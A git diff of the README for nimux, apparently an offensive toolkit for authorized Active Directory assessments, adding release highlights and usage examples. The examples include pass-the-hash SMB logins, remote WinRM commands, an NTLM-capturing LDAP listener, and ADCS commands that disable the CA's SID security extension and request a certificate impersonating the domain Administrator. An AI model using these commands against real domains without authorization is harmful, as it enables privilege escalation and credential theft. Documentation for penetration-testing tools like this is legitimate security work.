@@ -13,6 +13,8 @@
 
 nimux is a native command surface for authorized security assessments. It combines network enumeration, lightweight web discovery, credential validation, Active Directory operations, Kerberos workflows, remote execution, file movement, secrets collection, DCSync, GPO operations, database clients, and SOCKS routing into one Pure-Nim toolkit.
 
+Current release: `v1.0.5`
+
 You are on the official public repository for nimux.
 
 - Website: https://nimux.wiki
@@ -28,6 +30,23 @@ nimux is built for authorized testing only. Do not use it against third-party sy
 Usage examples, command references, and workflow notes are maintained in the documentation:
 
 https://docs.nimux.wiki
+
+# Latest Release Highlights
+
+`v1.0.5` adds the lightweight discovery layer around the existing AD/remote-ops command surface:
+
+- Global `nimux --version`
+- HTTP directory, file, and vhost discovery with workers, recursion, link extraction, resume, and false-positive filters such as `-fs`
+- DNS subdomain discovery with worker support
+- Read-only SMB share spidering with depth, size, pattern, and interesting-file filters
+- Anonymous/null-session SMB share enumeration fixes
+
+It also carries the recent ADCS, BloodHound Legacy, Kerberos execution, and LDAP capture work from the `v1.0.4` line:
+
+- Native ADCS policy get/set workflows for `EditFlags` and `DisableExtensionList`
+- RPC ADCS request/auth flows with UPN/SID request support and PFX output
+- BloodHound Legacy 4.x-compatible output with ACL/object-control data
+- LDAP capture listener with random NTLM challenge generation and repeated connection handling
 
 # AI Integrations
 
@@ -101,6 +120,7 @@ Use the standalone Linux binary:
 ```bash
 chmod +x nimux
 ./nimux --help
+./nimux --version
 ```
 
 ## Docker
@@ -126,6 +146,14 @@ nimux http app.htb --dirs words.txt --auto-calibrate --recursion --depth 2 --ext
 nimux http app.htb --files words.txt --extensions php,txt,bak --workers 100 --filter-regex 'Not Found' -fs 325
 nimux http 10.10.10.10 --vhosts vhosts.txt -d app.htb --workers 100 --resume seen.jsonl --json
 nimux dns app.htb --subdomains subdomains.txt --workers 200 --json
+```
+
+Run read-only SMB spidering:
+
+```bash
+nimux smb files01.corp.local --shares
+nimux smb files01.corp.local --spider --share Public --max-depth 3
+nimux smb files01.corp.local --spider --interesting --size-limit 10485760
 ```
 
 Run the MCP wrapper:
@@ -193,16 +221,44 @@ sudo apt install ../nimux_*.deb
 nimux scan 10.10.10.0/24 --port 445,389,5985 --open
 nimux smb dc01.corp.local -u operator -H <nt_hash> -d corp.local --shares --users
 nimux smb files01.corp.local -u operator -p '<password>' -d corp.local --spider --max-depth 3 --interesting
+nimux ldap dc01.corp.local -u operator -p '<password>' -d corp.local --bloodhound --legacy --bloodhound-out bh-legacy.zip
 nimux winrm host.corp.local -u operator -p '<password>' -d corp.local --cmd whoami
 nimux kerberos dc01.corp.local -u operator -p '<password>' -d corp.local --request kinit --out operator.ccache
 nimux scan 10.10.10.0/24 --port 445,389,5985 --proxy socks5://127.0.0.1:1080
 ```
 
+ADCS policy and certificate workflow examples:
+
+```bash
+nimux ldap dc01.corp.local -u 'gMSA_CA_prod$' -H <nt_hash> -d CORP.LOCAL \
+  --adcs-policy --ca CORP-CA --adcs-get-disable-extension-list
+
+nimux ldap dc01.corp.local -u 'gMSA_CA_prod$' -H <nt_hash> -d CORP.LOCAL \
+  --adcs-policy --ca CORP-CA \
+  --adcs-set-disable-extension-list 1.3.6.1.4.1.311.25.2
+
+nimux ldap dc01.corp.local -u svc_infra -p '<password>' -d CORP.LOCAL \
+  --adcs-request --adcs-rpc --ca CORP-CA --template User \
+  --upn Administrator@corp.local \
+  --sid S-1-5-21-1111111111-2222222222-3333333333-500 \
+  --out administrator.pfx
+```
+
+LDAP capture listener:
+
+```bash
+nimux ldap --server
+nimux ldap --server --srvhost 0.0.0.0 --srvport 2222
+nimux ldap --server --srvhost 0.0.0.0 --srvport 2222 --challenge 1122334455667788
+```
+
 # Features
 
 - TCP and UDP scanning with protocol-aware probes
+- Lightweight HTTP directory/file/vhost discovery and DNS subdomain discovery
 - SMB authentication, enumeration, read-only share spidering, file operations, coercion, and ticket capture workflows
 - LDAP and Active Directory enumeration, writes, ACL paths, roasting, RBCD, shadow credentials, and ADCS support
+- BloodHound Legacy 4.x-compatible LDAP export mode
 - Kerberos TGT, TGS, S4U, ccache, kirbi, renewal, purge, and ticket forge workflows
 - WinRM, WMI, SCM, DCOM, scheduled task, and helper-service execution modes
 - MSSQL, PostgreSQL, MySQL, HTTP, HTTPS, WebDAV, FTP, SSH, RDP, VNC, NFS, and AFP clients
@@ -218,6 +274,7 @@ nimux scan 10.10.10.0/24 --port 445,389,5985 --proxy socks5://127.0.0.1:1080
 | `scan` | TCP and UDP service discovery |
 | `smb` | SMB enumeration, auth checks, file operations, and coercion |
 | `ldap` | AD queries, writes, roasting, ACLs, RBCD, shadow credentials, ADCS |
+| `http`, `https`, `dns` | Lightweight web and DNS discovery |
 | `kerberos` | TGT, TGS, S4U, ticket conversion, renewal, purge, forge |
 | `winrm` | WinRM command execution, shell, and file helpers |
 | `scm`, `bin`, `cim`, `tsch`, `mmc` | Remote execution transports |
